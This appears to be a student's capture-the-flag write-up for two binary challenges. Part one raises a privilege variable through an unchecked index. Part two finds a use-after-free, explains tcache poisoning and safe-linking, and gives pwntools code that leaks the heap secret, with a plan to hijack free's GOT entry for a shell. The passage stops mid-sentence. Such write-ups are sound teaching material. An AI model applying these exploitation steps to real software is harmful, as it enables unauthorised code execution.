 ### Cristian Domenico Dramisino (12338532)

## Introduction

For these challenges we will use some interesting tools:
- [Ghidra](https://ghidra-sre.org/)
- [pwntools](https://docs.pwntools.com/en/stable/install.html)
- [gdb](https://ioflood.com/blog/install-gdb-command-linux/) with [gef](https://github.com/hugsy/gef) extension
- [Windows 10 virtual machine](https://www.microsoft.com/en-us/software-download/windows10ISO) Version Pro
- [Flare-Vm](https://github.com/mandiant/flare-vm) installed on the windows 10 VM


# Challenge part 1 

## Introduction
We can access to this challenge through this [link](https://sas.hackthe.space/#/challenges/Binary%200)


From the description of the flag we don't get many useful information.

We just understand that:
```
You will need the following information:

- The [binary file](https://sas.hackthe.space/cms/files/47d2dc9ac76f0b965c0617decce9d5e432a6b06b004066c543c261462f54b727/binary0).
- The system running the binary and the flag can be reached via `nc provinggrounds.sas.hackthe.space 31337`
- The flag regex is `FLG_\{[a-z0-9_]+\}`
```
- ==**we can download the binary file from this [link](https://sas.hackthe.space/cms/files/47d2dc9ac76f0b965c0617decce9d5e432a6b06b004066c543c261462f54b727/binary0)**==
- **==we can reach the server that runs the binary using==** `nc provinggrounds.sas.hackthe.space 31337`




## Binary dynamic analysis
What we do here is to perform a dynamical analysis of the binary, and so we try to use it in order to understand what are its functionalities.

So we can easily give the execution permissions to it:
```shell
chmod +x binary0
```

At this point we can execute it:
```shell
./binary0
```

We can see that we have a menu here that gives us the possibility to choose what to do:
- ![[Pasted image 20240524155620.png]]


By now, the most interesting sections here are:
- **==Administration area==**
- **==Check privilege==**

### Privileged features interaction 

Let's try to interact with them.

If we try to access to `Administration area` we get this message:
![[Pasted image 20240524155725.png]]
- ==**so we can understand that we need some types of privileges to access to it**==

If we try to access to `Check privilege` we get this message:
![[Pasted image 20240524155846.png]]
- ==**So maybe the privileges are managed with a string. Let's take notes about it....**==

So let's interact with `Manage bugs`


### Manage bugs interaction

When we access to the area`Manage bugs` we can see another internal menu:
- ![[Pasted image 20240524160056.png]]


At this point we can play with these features and we can notice some interesting stuff:

#### Add bug
`Add bug` **==gives us the possibility to add a new bug in the list, composed by a description and a security level==**:
- ![[Pasted image 20240524160225.png]]

#### Delete bug
`Delete bug` **==gives us the possibility to remove a bug from the list using his==** `id`:
- ![[Pasted image 20240524160324.png]]

#### Change bug
`Change bug` ==**gives us the possibility to change the severity of a bug using his**== `id`:
![[Pasted image 20240524160444.png]]


But if we play there with the values we can see an interesting thing...
Differently from others input values it seems that the `id` value we insert here <mark style="background: #FF5582A6;">is not checked or validated before it is used.
</mark>

In fact, if we put a value higher than `9` there, <mark style="background: #FF5582A6;">we get a strange result, and so basically it seems that we have access to a memory address that must not be accessible...</mark>

*Examples:*
1. ![[Pasted image 20240524160910.png]]
	1. Here we can see that if we change the `id` 11 we obtain a strange result. <mark style="background: #FF5582A6;">The fact is that we could not be able to access to that memory section...</mark>
2. ![[Pasted image 20240524160827.png]]
	1. In this case it seems that we are accessing to a unauthorized memory address


#### List bugs
`List bugs` ==**shows us the bug we had insert before:**==
![[Pasted image 20240524161057.png]]




## Binary static analysis
At this point we cannot retrieve other information from the dynamic usage of the binary, so we can perform a static analysis on it.

First of all we can see the security of the binary using `checksec` command:
```shell
checksec binary0
```

The result is:
![[Pasted image 20240524161230.png]]
- the binary seems to be well protected, but the strange behaviour we got before could be interesting


What we can do now is to try to ==**disassemble the binary and study the code using Ghidra**==:
- ![[Pasted image 20240524161507.png]]


> NOTE: if you don't see this info on Ghidra just click on `Window -> Decompiler view` and then  `Window -> Listing` 


So starting from the function `main_menu` ==**we can move and inspect the code of the features provided by the binary file.**==


==**The first thing to do is to analyze the administration area and the privileged functions.**==


### option_check_privileges function analysis
This function basically prints our privileges:
- ![[Pasted image 20240524161934.png]]

### option_admin_area function analysis
This is a very interesting function for our challenge because it:
1. <mark style="background: #FF5582A6;">checks for privileges </mark>
	1.  if the privileges are currently set to `AUTORIZED` then it seems to print the flag

![[Pasted image 20240524162100.png]]


This because the function `is_authorized` basically checks the content of the variable `security_level`:
- ![[Pasted image 20240524162131.png]]




<mark style="background: #BBFABBA6;">So maybe to solve the challege we need a way to change our privilege to</mark> `AUTHORIZED` 
<mark style="background: #BBFABBA6;">And so, we need to change the variable</mark> `security_level` <mark style="background: #BBFABBA6;">content</mark>.


At this point we can study the other parts of the code.

Since we have done a dynamic analysis on the binary and since we didn't get any strange behaviour except in the `Change bug` feature we can start on analyzing this part of the code.

So let's go back to `main_menu` and follow the code to reach `option_change_bug` :
- `main_menu -> option_manage_todos -> option_change_bug`

### option_change_bug function analysis
==**We have noticed that if we put a value greater than**== `9` ==**we get a strange behaviour.**==

So let's see what happens in the code:
- ![[Pasted image 20240524163252.png]]




We can see from the green highlighted line that it takes in input an integer using `get_input`, so let's see what `get_input` does:
- ![[Pasted image 20240524163356.png]]
	- basically nothing relevant, ==**it takes an input with**== `scanf` ==**and returns 1 if the read value is an integer, 0 otherwise**==


So let's continue on `option_change_bug`...

If we continue to analyze the code we can see that the function reads an integer and then:
1. checks the content of `* (long * )(bug_list + (long)local_18 * 0x20)` and so basically 
	1. takes the address of the "array" `bug_list` adds to the value we read in input multiplied by 32  because `0x20` is 32 in integers
		1. if this value is `-1` then prints a message, otherwise gives us the possibility to add o subtract 1 to the content of this address
This in this part of the code:
- ![[Screenshot 2024-06-07 alle 14.00.37.png]]


Now, the idea is that with this approach we can modify the value of the bugs, since we can access to them using the `id`, but the `id` <mark style="background: #FF5582A6;">is not validated so we can access to each memory address, passing an arbitrary</mark> `id`.


This portion of code gives us the possibility to
- add 1 to the content of the address we are accessing only if the value is not equal to 5
- subtract 1 only if the content is not equal to 1:
	- ![[Pasted image 20240524164333.png]]



So the big idea here is:
1. <mark style="background: #BBFABBA6;">try to access to the memory address of the variable</mark> `security_level`
2. <mark style="background: #BBFABBA6;">see what happens if we subtract 1 or if we add 1 to the content of this memory address</mark>


Another interesting thing here is that we have the access to addresses starting from the address of `bug_list`:
- ==**so if we put as id**== `-1` ==**we can have the access to the memory address** ==`bug_list_address + (-1 * 32)`
- **==so if we put as id==** `1` **==we can have the access to the memory address==** `bug_list_address + (1 * 32)`


### security_level address getting
<mark style="background: #BBFABBA6;">So at this point, to access exactly to the variable</mark> `security_level` <mark style="background: #BBFABBA6;">we need to understand the offset we have between</mark> `bug_list` and `security_level`. 

We can do it performing a difference between their addresses.

From Ghidra we can easily see the addresses double clicking on the name of the variables:

Double click on `bug_list`:
- ![[Pasted image 20240524165212.png]]
	- so the address is `00105f00`

Double click on `security_level`:
- ![[Pasted image 20240524165138.png]]
	- so the address is `00104020`



**We can easily calculate the difference between these hex values using a calculator:**
- ![[Pasted image 20240524165401.png]]

Or also on this [website](https://www.calculator.net/hex-calculator.html?number1=105f00&c2op=-&number2=104020&calctype=op&x=Calculate) :
- ![[Pasted image 20240524165504.png]]



At this point we know that the offset is `7904`.
==**But we know from the line**== `* (long * )(bug_list + (long)local_18 * 0x20)` ==**that our input is multiplied by**== `32`.


So to hit the right `security_level` address we need to divide `7904` by `32`. 

==**The result is**== `247`.


Now at this point, `bug_list` **==has an higher address related to==** `security_level`, ==**so our input must be**== `-247`.


## Trying to hit security_level address

Let's try our idea to see if it works.

So tun the binary and add a dummy bug:
- ![[Pasted image 20240524165909.png]]


Let's try now to modify the `security_level` variable:
- ![[Pasted image 20240524170047.png]]
	- in this case we are decreasing it by one

Let's see if our operation afflicted the variable we want to afflict.
So let's go back to the main menu and check the privileges:
- ![[Pasted image 20240524170149.png]]


Boom, something happened, so we are hitting the right address.

**==Now let's try what happens if we add 1 to the content of the variable.**
**But first re-execute the binary and the dummy bug adding.==**


**==At this point try to add 1:==**
- ![[Pasted image 20240524170410.png]]

**==So let's go back to the main menu and check the privileges:==**
- ![[Pasted image 20240524170442.png]]


The initial `U` disappeared. Very nice.

==**Let's add another 1 to the variable:**==
- ![[Pasted image 20240524170537.png]]

BINGO. 

==**Now try to access to the**== `Administration area`:
- ![[Pasted image 20240524170624.png]]

**WE GOT THE PRIVILEGES.**





## Flag getting
Now connect to the remote server using:
```shell
nc provinggrounds.sas.hackthe.space 31337
```


At this point we can re-do the same actions done in local and so:
- add a dummy bug
- increase 2 times the bug with `id` equal to `-247`
- access to the `Administration area`

![[Pasted image 20240524171004.png]]




<mark style="background: #BBFABBA6;">So the flag for part 1 is:</mark> `FLG_{4ppr0v3d_by_z3r06r4v17y_0bbefbabae14eb234}`










# Challenge part 2

## Introduction
We can access to this challenge through this [link](https://sas.hackthe.space/#/challenges/Binary%201)


From the description of the flag we don't get many useful information.

We just understand that:
```
Your mind races with possibilities. The stakes are higher now, and the challenge more complex. But this is what you live for—pushing the limits, proving yourself, and making a mark.

You will need the following information:

- The [system files](https://sas.hackthe.space/cms/files/dd4b98a8266fb8c74061513f4a2826ea895192f6759d7c52424fcda3981bab56/binary1.zip).
- The system running the binary and the flag can be reached via `nc cyberphant0m.sas.hackthe.space 65432`
- The flag regex ix `FLG_\{[a-z0-9_]+\}`
```
- ==**we can download the files we require for the challenge from this [link](https://sas.hackthe.space/cms/files/dd4b98a8266fb8c74061513f4a2826ea895192f6759d7c52424fcda3981bab56/binary1.zip)**==
- ==**we can reach the server that runs the binary using**== `nc cyberphant0m.sas.hackthe.space 65432`




The system files we download are:
- ![[Pasted image 20240529164002.png]]

## Binary dynamic analysis
What we do here is to perform a dynamical analysis of the binary, and so we try to use it in order to understand what are its functionalities.

So we can easily give the execution permissions to it:
```shell
chmod +x chall
```

At this point we can execute it:
```shell
./chall
```

We can see that we have a menu here that gives us the possibility to choose what to do:
- ![[Pasted image 20240528182511.png]]


### Add bot feature interaction 

Let's try to interact with the `Add bot` feature:
- ![[Pasted image 20240528183003.png]]

We can play with it and we can understand that maybe under the cover there is an array that takes trace about the data we put in it.

The relevant things there are:
- **==we can choose only==** `id` ==**between 0 and 9**==
	- if we try an `id` < 0 or > 9 then the program exit:
		- ![[Pasted image 20240528183230.png]]
- ==**we can choose the**== `length` ==**of the identifier**==
- ==**we can choose arbitrary identifiers (a string)** ==
	- if we put a string that is greater than the `length` we chose then the program does nothing (maybe it is truncated by the code)

If we try to add 2 times a bot with the same id the program terminates:
- ![[Pasted image 20240528184649.png]]


If we put a string instead an integer in the `length` or `id` input, the program terminates:
- ![[Pasted image 20240528184737.png]]
- ![[Pasted image 20240528184831.png]]


### Remove bot feature interaction 
Let's try to interact now with `Remove bot`  feature so let's remove the previous added bot (`id` 0):
- ![[Pasted image 20240528183739.png]]

If we play with it we can see that:
- if we try to remove a bot already removed or never added then the program exit without errors:
	- ![[Pasted image 20240528183900.png]]


If we try to put a string in the `id` field the program terminates:
- ![[Pasted image 20240528184905.png]]

### Attack feature interaction 
Let's try to interact now with `Attack` :
- ![[Pasted image 20240528184035.png]]

Ok, we have to assign at leat 3 botnets, so lets do it with the add feature and retry to perform the attack.

![[Pasted image 20240528184150.png]]
- so it prints our added botnets

==**Here we can see that if we put a string longer than the**== `length` ==**we chose then the program truncate it to the first**== `length` ==**chars**==.


### Help feature interaction 
Let's try to interact now with `Help` :
- ![[Pasted image 20240528184331.png]]

This is not so relevant, it just explains the functionalities of the program, ==**but we can see that it says**== `The default capacity is 1.000 bots, which can only be changed by our admins.`

Maybe there is a secret feature?

### Quit feature interaction 
This just makes the program to terminate:
- ![[Pasted image 20240528184545.png]]



## Binary static analysis
At this point we cannot retrieve other information from the dynamic usage of the binary, so we can perform a static analysis of it.

First of all we can see the security of the binary using `checksec` command:
```shell
checksec chall
```

The result of this command is:
![[Pasted image 20240528185024.png]]

Mhhh, there is No PIE and Partial RELRO, but what does this mean?
1. ==**PIE (Position Independent Executable)**: **Indicates whether the executable was compiled as a position-independent executable**. ==
	1. An executable with PIE can be loaded into memory at random addresses, making it more difficult to exploit certain vulnerabilities. 
	2. "No PIE" means that the binary was not compiled with this option and therefore will be loaded into memory at a fixed address (usually 0x400000 on 64-bit systems).
	3. So this means that at each execution the binary is loaded in the same memory address and so the content of the binary will be always in the same position (like the functions in it)
2. ==**RELRO (Relocation Read-Only): This indicates the degree to which the relocation tables of the executable are protected in memory.** ==
	1. "Partial RELRO" means that only some parts of the relocation tables are made read-only, while others remain writable.
	2. So it is possible to rewrite these parts of the relocation tables.




Now we can try to disassemble the code with ghidra in order to see if we can get useful information about it.


### Using ghidra on the binary

What we can do is -> charge the binary file in ghidra and try to disassemble it.

Looking at the function it seems to be a complete mess, the function have no meaningful names:
- ![[Pasted image 20240528190057.png]]

**==But we can try to rename them if we get the function that represents the main menu...==**

If we play around we can notice that the ==**main menu is managed by the function**== `FUN_00401256`:
- ![[Pasted image 20240528190212.png]]


So let's rename it in `main_menu` using:
- right click on the name (the yellow one in the image) -> Rename function
- ![[Pasted image 20240528190411.png]]


Now, looking at the switch and looking at the functionalities we can easily rename all the features functions:
- ![[Pasted image 20240528190747.png]]


==**We can also notice a strange value in the switch that is**== `0xffffffff`. With a rapid research on internet we can see that it is just `-1`

So let's rename the function in this case as `maintenance_function`, we can retrieve it from the puts content:
- ![[Pasted image 20240528191235.png]]



**==Another strange function that we can see in the main menu is:==**
- ![[Pasted image 20240528191342.png]]


If we try to enter in it we can notice that it seems to be a initialization function:
- ![[Pasted image 20240528191512.png]]

So let's call it `init_function`:
- ![[Pasted image 20240528191706.png]]

==**In addition we can see that it initializes a value to**== `1000`

### add_bot function analysis

What happens in this function?
- ![[Pasted image 20240528191819.png]]

1. ==**it checks if the bot with the**==`id` ==**we insert already exists, it checks the presence of 1 in a certain memory location**==
2. **==if this memory location is not equal to 1==** 
	1. then it asks us for the `length` of the identifier
	2. ==**at this point it asks us to insert the identifier (a string)**==
		1. an interesting thing is that it uses `malloc` to store it, ==**so it is stored in the heap memory space**==

Now using the `attack` function we know that each bot has an `identifier` string and a `capacity` that for default is `1000.

So maybe the `init_function` is used to initialyze the bot array.

==**So let's construct a structure in ghidra that manages directly these data, in order to make the code more readable.**==

#### bot structure adding 
From the `init_function` we can see that a bot is composed by 3 elements.
- ![[Pasted image 20240528192641.png]]

1. ==**the first one is of 8 bytes, so maybe it is used as string pointer** 
2. ==**the second is of 4 bytes and it is initialized to 1000**==
3. ==**the third one is of 4 bytes and it is initialized to 0**==

Maybe they can be 
1. identifier string pointer
2. capacity integer
3. is or not integer


So let's construct a bot structure in this way:
- **==Data type manager -> chall -> New -> Structure==**

And add these values:
- ![[Pasted image 20240528193130.png]]
	- let's maintain this order



Give it `bot` name:
- ![[Pasted image 20240528193411.png]]

Click on the save icon on the right:
- ![[Pasted image 20240528193206.png]]
- ![[Pasted image 20240528193421.png]]



At this point we can understand also from the `init_function` that `param_1` is the start pointer for the array of bots, so let's change his name to `bot_array` and the type to `bot *` .


![[Pasted image 20240528193617.png]]
- it becomes really better

To do it just 
1. right click on `param_1 ` -> Rename variable -> put `bot`
2. right click on `bot` -> Retype Variable -> put `bot*`



Let's change each function that uses it and also the variable in the main menu to `bot*`:
- ![[Pasted image 20240528193941.png]]
- ![[Pasted image 20240528194020.png]]
- ![[Pasted image 20240528194114.png]]
- ![[Pasted image 20240528194139.png]]
- ![[Pasted image 20240528194226.png]]
	- we changed here the name of the variable to `bot_array`

**Now we have a more comprehensible code to analyse.**



At this point we can continue on analysing the functions and we can see the `add_bot`:
- ![[Pasted image 20240529100612.png]]

Summary of this function:
1. **==it reads an integer with the line==** `cvar1 = FUN_00401bab(&local28) ` ==**that will be the**== `index` ==**of the bot to add**==
	- so we can change the name in `read_integer`
2. ==**so it checks if the bot is already used with**== `if(bot_array[local28].is_used==1)`
3. ==**then it reads another integer that will be the length of the identifier we want to use with the line**== `cvar1 = FUN_00401bab(&local24) `
4. ==**it passes the pointer to the "string"**== `identifier_string` ==**and the length read before to the function**== `FUN_0040154b`, ==**this function will ask to the user for a string and will read it**==
	1. so let's change the name of this function to `read_string`
	2. let's change also the variable name and type we pass to it, since we know them

At this point we can follow the flow and the functions, but in `read_integer` we can only notice that only when an integer is read then it returns `1`

Let's see `read_string`

### read_string static analysis
![[Pasted image 20240529102002.png]]

We can see here that it asks for a string and what the function does is:
```c
  while(true) {
    if (length <= local_14) {
      do {
        iVar2 = getchar();
      } while (iVar2 != 10);
      *local_20 = '\0';
      return;
    }

``` 
- with this `if`, a while is executed and reads char by char
	- ==**now, this is executed when the length is greater than**== `local_14` ==**that is the counter of the current number of char read**==
	- ==**so this part of the code is used to consume the chars in excess**== 
		- *for example, we have a length of 16 and we pass 24 chars, when it reads 16 chars the while will consume the other 8 chars*

```C
  
    do {
      iVar2 = getchar();
      cVar1 = (char)iVar2;
    } while (cVar1 == '\n');
    if (cVar1 == -1) break;
    *local_20 = cVar1;
    local_14 = local_14 + 1;
    local_20 = local_20 + 1;
  }
  return;
}

```
- with this part of the code we read the chars until we get a `\n` 


But the interesting line here is:
```c
if (cVar1 == -1) break;
```
- We know that `cVar1` will contain a char so we can modify that `-1` on ghidra to change it in his char representation:
	- right click on `-1` -> char

The result will be:
```C
if (cVar1 == '\xff') break;
```

<mark style="background: #FF5582A6;">So basically it says that when</mark> `\xff`<mark style="background: #FF5582A6;"> is read then the original while is closed. </mark>

**Very interesting, because if we put** `\xff` **in input we can allocate a string that contains no chars...**



At this point we can try to analyze all the function in a deeper way, but no useful information will be found except for the function `maintenance_function` and `remove_bot`

### remove_bot static analysis
![[Pasted image 20240529110201.png]]
**==Here we can understand that this function is used to remove a botnet.==**
1. ==**it asks for the bot**== `id` ==**and checks if it in use or not**==
	1. `if (bot_array[local_14].is_used == 0)`
2. ==**if it is used then the**== `identifier_string` ==**is deallocated with**== `free`
3. ==**then**== `bot_array[local_14].is_used` ==**is set to**== `0`


### maintenance_function static analysis

![[Pasted image 20240529103250.png]]


==**Here we can understand that this function is used to modify a bot.**==
1. ==**it asks for the bot**== `id` ==**and checks if it is less than**==`10`
2. ==**then it asks to the user for a string (in this case always of 16 chars since**== `0x10` ==**is hardcoded in the function call)**==
	1. `read_string(bot_array[local_18].identifier_string,0x10);`
3. ==**then it asks for a new capacity (an integer)**==


An interesting thing here is that when we put the new capacity it sets the variable `DAT_0040420c` to 1.
- <mark style="background: #FF5582A6;">But if we put a char and not an integer when it asks for the capacity this set is skipped, since</mark> `cVar1` <mark style="background: #FF5582A6;">will not return</mark> `\x01`

But interesting thing here:
- it doesn't check if the bot has `is_used` equal to 1
- <mark style="background: #FF5582A6;">so basically it doesn't check if the bot is allocated or not</mark>





Let's try it in a dynamic way to understand what happens:
1. Let's try if we can modify a bot
	1. ![[Pasted image 20240529104121.png]]
	2. It seems to do it and says that `Maintenance mode enabled`
2. Let's try if we can modify a bot never created
	1. ![[Pasted image 20240529103846.png]]
	2. in this case we obtain a core dump, so we are trying to access on a non admitted memory address
3. Let's try if we can modify a deallocated botname
	1. ![[Pasted image 20240529104756.png]]
	2. <mark style="background: #FF5582A6;">This is very strange, it seems to modify a deallocated bot, this means that probably it will overwrite an heap bin (we will see what it is)</mark>


But let's understand if the modifies are really done...

We can add 3 bots and use `attack_function` to print them:
- ![[Pasted image 20240529105027.png]]

Now let's modify one of them:
- ![[Pasted image 20240529105107.png]]
	- Mhh it seems we cannot use the `attack_function` if we are in maintenance mode



But how this manteinance mode is managed? Let's see the `main_menu`:
- ![[Pasted image 20240529105240.png]]

<mark style="background: #FF5582A6;">Oh, but we have seen that if we put in the</mark> `New capacity` <mark style="background: #FF5582A6;">a char instead of an integer the setting of</mark> `DAT_0040420c` to `1` <mark style="background: #FF5582A6;">is skipped...</mark>

So let's try if we can achieve it...

Add 3 bots, modify 1 (putting a char instead a integer in the capacity ), use the attack function to print them:

1. ![[Pasted image 20240529105507.png]]
2. ![[Pasted image 20240529105520.png]]
3. ![[Pasted image 20240529105533.png]]

Great, we can see it :)



## Using gdb to understand what happens on the memory

At this point we have noticed that it is possible to change a botname also if it is deallocated, so let's understand what happens on the memory.

To do that we can use `gdb`:

```shell
gdb ./chall
```
- ![[Pasted image 20240529110612.png]]



Before starting the program we need to set a breakpoint. The most useful one is on the `main_menu` `while`, ==**because in this way we will stop always after doing an operation, since each feature goes back to the main menu...**==

So let's get it from ghidra:
- ![[Pasted image 20240529110830.png]]

So we can put a break point on `00401469` that is the address of the while instruction:
- ![[Pasted image 20240529110928.png]]



At this point we can run the program, and we can 
- ==**add 3 bots**==
- ==**remove one of these bots**==
- **==and modify this removed one==**

When gdb stops on a breakpoint we can insert `c` to make it continue the running...

==**When we have done this actions we can consult the heap bins using**== `heap bins`:
- ![[Pasted image 20240529111255.png]]

We can see that it says that this bin is corrupted, because we wrote on it...

<mark style="background: #FF5582A6;">So we are really able to write on bins... this can open the door to an attack called</mark> `Tcache poisoning` <mark style="background: #FF5582A6;">that can lead us to obtain a shell.</mark>

But wait. What are we talking about?

### What are bins?
==In the emory management in glibc malloc implementation, **heap bins** are structures used to manage free memory chunks. ==

==**When a chunk of memory is freed, it is placed into one of these bins based on its size.** ==

The bins are used to efficiently manage and allocate memory to minimize fragmentation and improve performance.

There are different types of bins used in glibc's malloc implementation:
1. **Fast Bins**:
    - Used for small, quickly-reused chunks of memory.
2. **Unsorted Bin**:
    - Temporarily holds newly freed chunks of any size before they are moved to the appropriate bin.
3. **Small Bins**:
    - Used for small chunks of memory that are larger than those handled by fast bins.
4. **Large Bins**:
    - Used for larger chunks of memory.s.
5. **Tcache Bins**:
    - Introduced in glibc 2.26, tcache (thread cache) bins are a per-thread cache of recently freed chunks.
    - Each thread has its own tcache, which reduces contention and improves performance in multithreaded applications.
    - Tcache bins are designed to serve as a fast, thread-local cache for small memory allocations, typically for chunks up to 64 KiB.

==**In this case we can see that Tcache bins are used...** ==


### How tcache works
==**They use single linked lists.**== 

==**Each entry in a tcache bin points to the next entry in the list, and there is no pointer back to the previous entry.**==

==**When a new chunk is inserted into a tcache bin, it is placed at the head of the list. This means the chunk is added to the beginning of the linked list.**==

==**When a chunk is allocated from the tcache, it is taken from the head of the list.**==
- <mark style="background: #FF5582A6;">the next one is put as the new head of the list</mark>

#### Memory allocation
When a thread requests a chunk of memory:
1. **Check Tcache**:
    - Before searching the global memory, the system checks if there is a chunk of the requested size in the thread’s tcache.
    - If available, the chunk is removed from the tcache list and returned to the requesting thread.

#### Deallocation
When a chunk is freed:
1. **Insert into Tcache**:
    - The chunk is placed into the appropriate list in the thread’s tcache, unless the list is already full.
    - Tcache lists have a configurable maximum length (usually 7 for each size).

2. **Overflow**:
    - If a tcache list is full, the chunk is transferred to the global memory management, i.e., to the appropriate fast bin, small bin, or large bin depending on the chunk size.




More details [Tcache](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/implementation/tcache/) [Malloc](https://www.openeuler.org/en/blog/wangshuo/Glibc%20Malloc%20Principle/Glibc_Malloc_Principle.html)




## Tcache poisoning attack

We have seen that it is possible to write on deallocated botnames, and so it is possible to change the cache bins.

==**This is a vulnerability that is called Use-After-Free and it is very dangerous in this case because if you are able to overwrite tcache bins data then it is possible to get a shell.**==

==**This vulnerability opens the door to the Tcache poisoning.**==

### But how does it work?
We know that each `tcache bin` contains a linked list of recently freed memory blocks of a specific size.

`Tcache poisoning` exploits the system's trust in the integrity of the `tcache` linked list. 
<mark style="background: #FF5582A6;">An attacker can corrupt this list to gain control over specific pointers.</mark>

#### Steps of the Attack
1. **Use-After-Free**: The attacker exploits a use-after-free vulnerability to overwrite pointers in the `tcache` list.
	1. We can do it because we are able to write on deallocated botnames
2. **Insertion of Malicious Pointers**: By manipulating the pointers, the attacker can make the linked list point to memory addresses controlled by the attacker.
	1. So we can insert an arbitrary address in the `tcache` linked list overwriting a deallocated botname
3. **Memory Allocation**: When the program requests a memory allocation from the `tcache`, it will use the blocks with the manipulated pointers. This can lead to the allocation of memory blocks controlled by the attacker.
	1. So this means that when we call `malloc` the `Tcache` returns an address in the linked list.
	2. If we have overwritten this addresses we can force the `Tcache` to return an address we want
4. **Arbitrary Code Execution**: Once the attacker controls memory addresses (the `tcache` returns the addresses chosen by the attacker), he can use the `malloc` function to write on arbitrary values on the address returned by the `tcache`



## What we want to do with this Tcache poisoning attack?

Well we know that in the binary we can use directly the function `malloc` to allocate botnames and `free` to deallocate botnames we can think about a Tcache poisoning attacks that:
1. <mark style="background: #FF5582A6;">writes on a</mark> `deallocated` <mark style="background: #FF5582A6;">bin the GOT entry address of the</mark> `free` <mark style="background: #FF5582A6;">function</mark>
	1. ==**we need to overwrite the GOT entry because when the binary calls the function**== `free` ==**it uses the GOT entry of this function (that is then converted in the real one) **==
		1. when the function is called, the resolver function updates the GOT entry with the actual address of the function
		2. ==**so if we overwrite the GOT entry we will force the resolving to another function that we can choose**==
2. `allocate` <mark style="background: #FF5582A6;">a new botname that contains the real address of the</mark> `system` <mark style="background: #FF5582A6;">function</mark>
	1. this because, ==**when we allocate a botname, the function**== `malloc` **==is called==**
	2. at this point the `tcache` ==**will return the adddress contained in the bin, that we overwrote with the**== `free` ==**GOT entry address**==
	3. so basically we will execute `malloc` on the `free` GOT entry, writing on this address the `system` real address
3. `allocate` <mark style="background: #FF5582A6;">a botname that contains the string</mark> `/bin/sh`
4. `deallocate`<mark style="background: #FF5582A6;"> the botname that contains</mark> `/bin/sh`
	1. since we have overwritten the `free` GOT entry with the `system` address what will happen here is basically
		1. call `free` GOT entry on `/bin/sh`
		2. but `free` GOT entry contains the `system` function real address
		3. so in the reality we are calling `system('/bin/sh')`

## What about the protection mechanisms?
`Safe linking` ==**is a technique used to protect against memory corruption attacks such as** ==`tcache poisoning`. 

Its implementation in glibc aims to enhance the security of memory management by preventing attackers from easily manipulating the linked lists used to manage deallocated memory blocks.

The `safe linking` t==**echnique obfuscates the addresses of pointers in linked lists using XOR with a random value derived from a "secret" called L that is unique for each program execution.** ==

1. **Secret** : It is a secret value generated at the start of the program, it is a value called **L** **that is shifted by 12 bits** 
	1. So it won't change during the usage of the binary...
2. **Obfuscation**: When a memory block is deallocated and added to a linked list (such as in a `tcache bin`), the address of the next block in the list is obfuscated using XOR with the secret.
3. **Address Recovery**: When a block is removed from the list for a new allocation, the original address is recovered by applying XOR with the secret again.


![[Screenshot 2024-06-07 alle 14.38.30.png]]
- here L is the secret
- P is the target pointer


**==So we need to extract this L shifted value to be able to overwrite the addresses in the linked lit of the==** `Tcache`


See more [here](https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation)

## Create an exploit using pwntools

First of all we can setup our exploit using these lines:
```python
from pwn import *

context(os="Linux", arch="amd64")

p = gdb.debug('./chall', 'b *0x00401469')
```
- this will allow us to run gdb, and control it using the python script
- `p` will allow us to send values to the binary  and to print the output of it


At this point we know how the binary works and we can write some functions to interact with it:
```python
def allocate_bot(bot_id, length, identifier):
    p.sendline(b'1')  # add bot
    p.sendline(str(bot_id).encode())  # bot id
    p.sendline(str(length).encode())  # bot length
    p.sendline(identifier)  # bot identifier
    output = p.recvuntil(f'Added botnet to index {bot_id}\n'.encode())
    print(output.decode())


def deallocate_bot(bot_id):
    p.sendline(b'2')  # remove bot
    p.sendline(str(bot_id).encode())  # bot id
    output = p.recvuntil(f'Botnet index (0-9): Removed index {bot_id}\n'.encode())
    print(output)


def call_atttack_function_to_leak_data(bot_id):
    p.sendline(b'3')
    output = p.recvuntil(f'ID:{bot_id}\n'.encode())
    print(output)
    leaked_L_shifted = p.recvline().strip()[:8].ljust(8, b'\x00')
    leaked_L_shifted = u64(leaked_L_shifted)
    return leaked_L_shifted


def change_deallocated_bot(bot_id, address, payload):
    p.sendline(b'-1')  # change deallocated bot
    p.sendline(str(bot_id).encode())
    p.send(p64(address))
    p.sendline(payload)
    p.sendline(b'aaa')  # to avoid maintenance variable set to 1
    output = p.recvuntil(b'Invalid option\n')
    print(output.decode())
```


Here:
- `allocate_bot(bot_id, length, identifier)` requires:
	- the bot `id` we want to add
	- the `length` of the string identifier we want to add
	- the `identifier` that is the string we want to put in the botname, and so the string to allocate
- `deallocate_bot(bot_id)` requires
	- the `id` of the botname we want to deallocate
- `call_atttack_function_to_leak_data(bot_id)` requires
	- a bot `id` that is used to extract the line printed after, this will be used to extract some useful information we need to perform the attack, and so the **L shifted by 12 bits.**
- `change_deallocated_bot(bot_id, address, payload)` requires
	- the bot `id` we want to change
	- the `address`  that is what we need to write on the botname of this bot
	- a `payload` that is used to align the data sending and to stop the sending of it



At this point we can start our exploit.

==**The first thing to do is to extract L shifted by 12.**==

### L shifted by 12 extraction

To do it we can use:
```python
# allocation of 3 bots
allocate_bot(0, 16, b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
allocate_bot(1, 16, b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
allocate_bot(2, 32, b'cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')
allocate_bot(3, 32, b'dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd')

# deallcoate bot id 0 
deallocate_bot(0)

# allocate bot 0 passing only \xff to get his metadata (L shifted)
allocate_bot(0, 16, b'\xff')

# leak L shifted by 12
leaked_L_shifted = call_atttack_function_to_leak_data(0)
print(p64(leaked_L_shifted))
```

But what we are doing here?
1. ==**We allocate 4 bots, two of them with a string of 32 bytes, we will understand why after**==
2. ==**We deallocate the first bot**==
3. ==**We allocate a bot another time but passing**== `\xff`
4. ==**We print our list of bots using the attack function, and we are storing the contend printed as** ==`identifier` ==**string of the bot with**== `id` ==**0**==

#### But why this leaks the L shifted by 12 bits secret?
This works because in this specific case we are deallocating a unique botname, so the `tcache` contains a unique `bin`.

This means that the pointer to the next bin doesn't contain an addres, because there are no other bins. So it contains just the value `L shifted by 12 bits` secret.

Now we know from the code that: 
